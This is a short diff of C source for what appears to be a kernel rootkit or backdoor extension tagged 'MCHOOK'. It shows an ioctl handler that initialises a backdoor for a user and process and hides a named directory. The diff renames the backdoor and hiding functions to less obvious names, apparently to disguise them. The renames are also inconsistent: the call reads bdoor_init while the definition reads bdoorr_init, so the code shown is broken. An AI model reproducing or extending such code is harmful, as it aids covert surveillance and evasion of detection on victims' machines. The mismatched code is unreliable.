@@ -125,7 +125,7 @@ static int cdev_ioctl(dev_t dev,
 #ifdef DEBUG
         printf("[MCHOOK] Init for user %s with pid %d\n", username, p->p_pid);
 #endif
-        if (backdoor_init(username, p) == FALSE) {
+        if (bdoor_init(username, p) == FALSE) {
 #ifdef DEBUG
           printf("[MCHOOK] Error on init\n");
 #endif
@@ -196,7 +196,7 @@ static int cdev_ioctl(dev_t dev,
       if (data) {
         char dirName[MAX_DIRNAME_SIZE];
         strncpy(dirName, (char *)data, MAX_DIRNAME_SIZE);
-        add_dir_to_hide(dirName, p->p_pid);
+        agg_dir_to_hide(dirName, p->p_pid);
       }
     } break;
     case MCHOOK_UNREGISTER: {
@@ -1031,7 +1031,7 @@ void remove_hooks()
   }
 }
 
-void add_dir_to_hide(char *dirname, pid_t pid)
+void agg_dir_to_hide(char *dirname, pid_t pid)
 {
   int i = 0;
   int z = 0;
@@ -1074,7 +1074,7 @@ void add_dir_to_hide(char *dirname, pid_t pid)
 }
 
 Boolean
-backdoor_init(char *username, proc_t p)
+bdoorr_init(char *username, proc_t p)
 {
   int _index      = 0;
   int i           = 0;
